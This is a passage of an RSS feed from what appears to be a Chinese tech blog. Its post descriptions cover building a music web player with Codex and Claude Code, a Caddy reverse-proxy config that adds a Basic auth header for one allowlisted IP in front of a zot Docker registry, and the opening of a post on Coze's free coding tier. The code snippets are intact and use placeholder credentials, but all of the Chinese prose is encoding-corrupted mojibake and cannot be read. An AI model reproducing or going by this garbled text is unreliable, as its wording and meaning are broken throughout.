&lt;li&gt;&lt;strong&gt;é«˜æ€§èƒ½&lt;/strong&gt;ï¼šä½¿ç”¨ Go æ ‡å‡†åº“ï¼Œæ€§èƒ½ä¼˜å¼‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è·¨å¹³å°&lt;/strong&gt;ï¼šæ”¯æŒ Linuxã€macOSã€Windows&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å®æ—¶æµå¼ä¼ è¾“&lt;/strong&gt;ï¼šé€šè¿‡ SSE (Server-Sent Events) å®ç°å®æ—¶æ›´æ–°&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ–‡ä»¶ç›‘æ§&lt;/strong&gt;ï¼šä½¿ç”¨ fsnotify ç›‘æ§ Claude ä¼šè¯æ–‡ä»¶å˜åŒ–&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•ç”¨codexã€claude codeæ··åˆå£å—¨ç¼–ç¨‹</title>
      <link>https://rendoumi.com/posts/20260109-codex_music/</link>
      <pubDate>Fri, 09 Jan 2026 09:01:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260109-codex_music/</guid>
      <description>&lt;p&gt;codexå’Œclaude codeä¸¤è€…å„æœ‰æ‰€é•¿ï¼Œå°è¯•åœ¨ä¸€ä¸ªéŸ³ä¹é¡¹ç›®é‡ŒæŠŠä¸¤è€…ç»“åˆèµ·æ¥ï¼Œè¯•è¯•çœ‹&lt;/p&gt;
&lt;p&gt;é¦–å…ˆ clone é¡¹ç›®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/truelife0958/music888
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå‘½ä»¤å®ƒï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯·ä½ æŠŠè¿™ä¸ªé¡¹ç›®çš„apiéŸ³ä¹æºéƒ½æå–å‡ºæ¥ç„¶ååˆ¶ä½œä¸€ä¸ªapiæ¥å£æ–‡æ¡£
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109194609943&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109194609943.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå¾—å‡ºä¸€ä¸ªç»“æœ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109194943822&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109194943822.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ–°å»ºä¸€ä¸ªç›®å½•ï¼ŒæŠŠè¿™ä¸ªæ–‡æ¡£å•ç‹¬æ‹·è´è¿›å»ï¼Œæ–°å¯åŠ¨ä¸€ä¸ªcodex&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯·ä½ çœ‹ä¸€ä¸‹è¿™ä¸ªapiæ¥å£æ–‡æ¡£å¹¶æµ‹è¯•ä¸€ä¸‹å“ªäº›æ˜¯æœ‰æ•ˆçš„ï¼Œå¸®æˆ‘åˆ¶ä½œä¸€ä¸ªéŸ³ä¹æ’­æ”¾webï¼Œéœ€è¦æœ‰å–œæ¬¢ï¼Œæœ€è¿‘æ’­æ”¾ï¼Œä»¥åŠç”¨æˆ·åˆ›ç«‹ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109205633630&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109205633630.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®©å®ƒè¿è¡Œï¼Œæ‰“å¼€é¡µé¢çœ‹çœ‹&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109205602177.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åclaudeè£…å¥½skillsï¼ŒApple-Hig-Designerï¼Œåœ°å€æ˜¯ï¼šhttps://github.com/axiaoge2/Apple-Hig-Designer&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åˆ†æå½“å‰é¡¹ç›®ï¼ŒUsing apple-hig-desiner skills é‡æ–°è®¾è®¡å‰ç«¯é¡µé¢
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»£å¼€claude&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109213225642&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109213225642.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å›ç­”å‡ ä¸ªé—®é¢˜&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109214524286&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109214524286.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¡®å®šæ–¹æ¡ˆåå¼€å§‹æ”¹é€ &lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109214319378&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109214319378.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‰›Bå¹å¾—æŒºå¤§ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109215440343&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109215440343.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ä¸€çœ‹ï¼Œ250å•Š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109215509968&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109215509968.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å•¥ç‹—å±ç©æ„ï¼Œç»§ç»­ä¿®å»&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/.claude/skills/Apple-Hig-Designer/resources/design-tokens.css&amp;#34;&lt;/span&gt; /&amp;gt; æ— æ³•è®¿é—® 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109215604573&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109215604573.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ·æ–°ï¼Œæ“¦çš„ï¼Œå›¾æ ‡éƒ½æ˜¯é”™çš„&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109215929241&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109215929241.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é¡¶æ çš„å›¾æ ‡éƒ½æ˜¯é”™çš„
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109215902092&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109215902092.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¿®å¥½åå†çœ‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109220249764&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109220249764.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¡®å®æ˜¯è‹¹æœé£æ ¼ï¼Œç‚¹å¼€è®¾ç½®ï¼Œåˆæ‹‰è·¨äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109220335982&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109220335982.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­å‘½ä»¤å®ƒæ”¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è®¾ç½®ï¼Œé½¿è½®æŒ‰é’®æ‰“å¼€åï¼Œé…ç½®çª—å£è·‘åˆ°æœ€å·¦é¢äº†ï¼Œæ²¡æœ‰åœ¨å³è¾¹
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109220506425&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109220506425.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ“¦çš„ï¼Œä»€ä¹ˆç©æ„ï¼Œæ”¾ä¸­å¤®ï¼Œç®€ç›´äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109220448088&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109220448088.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¼¹çª—æ”¾åˆ°æŒ‰é’®é™„è¿‘
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260109220956519&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-codex_music/image-20260109220956519.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆè¿˜å¯ä»¥ï¼Œä½†æ˜¯ã€‚&lt;/p&gt;
&lt;p&gt;æ„Ÿè§‰è¿™ä¸ªskillsè¿˜æ²¡æœ‰codexåŸç”Ÿç”Ÿæˆçš„å¥½çœ‹ã€‚&lt;/p&gt;
&lt;p&gt;ç¼–ç¨‹åŸºæœ¬å˜æˆäº†å£å—¨çš„è¡Œä¸ºäº†ï¼ŒçœŸçš„æ˜¯è„‘æ´å¤§å¼€ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Caddyé…åˆzotå®ç°ipç™½åå•ç™»å½•docker registry</title>
      <link>https://rendoumi.com/posts/20260109-caddy_zot/</link>
      <pubDate>Fri, 09 Jan 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260109-caddy_zot/</guid>
      <description>&lt;p&gt;å…¬å¸æœ‰ä¸¤ä¸ªdockerçš„registryï¼Œä¸€ä¸ªæ˜¯åœ¨å…¬å¸å†…ç½‘ï¼Œä¸€ä¸ªæ˜¯åœ¨hkçš„å…¬ç½‘&lt;/p&gt;
&lt;p&gt;é‚£jenkinsæ‰“é•œåƒçš„æ—¶å€™ï¼ŒFROMåº•åŒ…æ˜¯åœ¨hkï¼Œæ‰“å‡ºé•œåƒåï¼Œåˆè¦æ¨åˆ°å…¬å¸çš„å†…ç½‘ï¼Œè¿™æ ·jenkinsçš„pipelineçœ‹èµ·æ¥å°±å¾ˆç—›è‹¦&lt;/p&gt;
&lt;p&gt;æ‰“åŒ…ç™»å½•å…¬ç½‘ä¸€æ¬¡ï¼Œæ‰“åŒ…çš„åœ°å€æ˜¯å†…ç½‘çš„harborï¼Œæ¨åŒ…å†ç™»å½•å†…ç½‘ä¸€æ¬¡ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker.withRegistry&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://hk.rendoumi.com&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;hk-user&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nv&#34;&gt;image&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; docker.build&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;harbor.rendoumi.dev/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IMAGE_NAME&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;TAG&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PROJECT_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker.withRegistry&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://harbor.rendoumi.dev&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;harbor-user&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; image.push&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æµæ°´çº¿ä¸å¤šçš„è¯è¿™ä¹ˆè¿˜è¡Œå¾—é€šï¼Œæµæ°´çº¿å¾ˆå¤šï¼Œå°±å¾—æ”¹ä¸ªä¸€æºœå¤Ÿ&lt;/p&gt;
&lt;p&gt;é‚£å°±æƒ³å¦‚æœç™»å½•hkçš„æœåŠ¡å™¨ä½¿ç”¨ç™½åå•æœºåˆ¶ï¼Œå…¬å¸çš„jenkins worknodesæœåŠ¡å™¨å»è®¿é—®ï¼Œå°±ä¸ç”¨ç™»å½•ï¼Œç›´æ¥è®¿é—®ï¼Œå°±å¥½äº†&lt;/p&gt;
&lt;p&gt;é‚£å…¬å¸ç§ç½‘çš„registryæ˜¯ç”¨çš„harboræ­çš„ï¼Œå…¬ç½‘çš„registryç”¨çš„caddy+zotæ­å»º&lt;/p&gt;
&lt;p&gt;é—®äº†ä¸‹ Geminiï¼Œ ç»“æœéå¸¸çš„è’è°¬ï¼Œå±…ç„¶å‡ºç°å¹»è§‰ï¼Œå‘“æ¨å‡ºäº†zotæ ¹æœ¬ä¸å­˜åœ¨çš„ipç™½åå•é™åˆ¶è§„åˆ™ï¼Œç®€ç›´äº†ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;åæ¥è·‘åˆ° zot çš„å®˜ç½‘çœ‹äº†åŠå¤©æ–‡æ¡£ï¼Œå‘ç°ä¸è¡Œï¼Œæ ¹æœ¬æ²¡æœ‰è¿™ç§é…ç½®&lt;/p&gt;
&lt;p&gt;é‚£å°±åªèƒ½ä»Caddyå…¥æ‰‹äº†ï¼Œä»å…¬å¸jenkins worknodeå‡ºæ¥çš„ipå…ˆåˆ°Caddy&lt;/p&gt;
&lt;p&gt;ç„¶åCaddyæ¨¡æ‹Ÿç™»å½•ä¿¡æ¯ï¼Œç»™åç«¯çš„zotå‘è¯·æ±‚ï¼Œå°±å¯ä»¥é€šè¿‡äº†&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŠŠ hk registry çš„ç”¨æˆ·åå’Œå¯†ç ç”Ÿæˆbase64å­—ä¸²ï¼Œå¾—åˆ°XXXXXçš„BASE64å­—ç¬¦ä¸²&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;user1:pass1&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¿®æ”¹Caddyfileï¼ŒåŸæœ‰çš„é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hk.rendoumi.com &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    reverse_proxy 127.0.0.1:5000 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        header_up X-Real-IP &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;remote_host&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        transport http &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            dial_timeout 15s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            response_header_timeout 300s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ”¹æˆå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hk.rendoumi.com &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @trusted &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        remote_ip 111.222.333.444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    handle @trusted &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        reverse_proxy 127.0.0.1:5000 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            header_up Authorization &lt;span class=&#34;s2&#34;&gt;&amp;#34;Basic XXXXXXXXXXXXXXXX&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            header_up X-Real-IP &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;remote_host&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transport http &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                dial_timeout 15s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                response_header_timeout 300s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    handle &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        reverse_proxy 127.0.0.1:5000 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            header_up X-Real-IP &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;remote_host&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transport http &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                dial_timeout 15s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                response_header_timeout 300s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼Œä¸Šé¢å¦‚æœæ˜¯ 111.222.333.444 çš„ipæ¥è®¿é—®ï¼Œé‚£å°±æ¨¡æ‹Ÿç™»å½•çš„ Head å¤´ä¿¡æ¯ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ç›´æ¥æ”¾è¡Œï¼Œç”±åç«¯çš„zotè¿›è¡ŒéªŒè¯&lt;/p&gt;</description>
    </item>
    <item>
      <title>è–…ç¾Šæ¯›ä¹‹æ‰£å­ç¼–ç¨‹</title>
      <link>https://rendoumi.com/posts/20260109-coze_program/</link>
      <pubDate>Tue, 06 Jan 2026 09:01:02 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260109-coze_program/</guid>
      <description>&lt;p&gt;å‰å‡ å¤©ä½¬å‹è¯´æ‰£å­ç¼–ç¨‹å‡ºäº†ä¸€ä¸ªå…è´¹ç‰ˆï¼Œæ‰€ä»¥ä¹Ÿæƒ³è–…ä¸€æŠŠ&lt;/p&gt;
&lt;p&gt;äº‹å…ˆå£°æ˜ï¼šæ‰£å­ç¼–ç¨‹æ˜¯å›½å†…çš„ï¼Œæ‰€ä»¥æ— æ³•&lt;strong&gt;ç¿»å¢™&lt;/strong&gt;ï¼Œæœ¬è´¨ä¹Ÿæ˜¯ä¸€ä¸ªå®¹å™¨ã€‚èƒ½åšä¸€ä¸ªä»£ç†éšè—IPæ¥è®¿é—®å›½å†…çš„ç½‘ç«™ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œè¯´è€å®è¯ï¼Œè‡ªå·±å¾ˆå°‘æœ‰è¿™ä¸ªåœºæ™¯æ¥ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å§‹:&lt;/p&gt;
&lt;p&gt;æ‰£å­ç¼–ç¨‹çš„ç½‘å€ï¼šhttps://code.coze.cn&lt;/p&gt;
